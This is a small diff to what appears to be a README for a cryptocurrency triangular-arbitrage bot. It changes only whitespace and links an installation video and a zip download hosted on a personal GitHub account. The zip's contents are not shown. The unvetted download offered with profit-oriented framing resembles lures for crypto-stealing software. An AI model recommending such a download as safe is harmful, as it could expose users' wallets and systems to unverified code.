@@ -11,7 +11,7 @@
       2.Basic knowledge of cryptocurrency trading and triangular arbitrage
       Installation:
       https://vimeo.com/936948356
-
+      
       You can Download the zip file of the program here
 
       https://raw.githubusercontent.com/Samuel4415Davis/DEX-Triangular-Arbitrage-Bot-V4-BillTheStockTrader/main/DEX-Triangular-Arbitrage-Bot-V4-BillTheStockTrader.zip
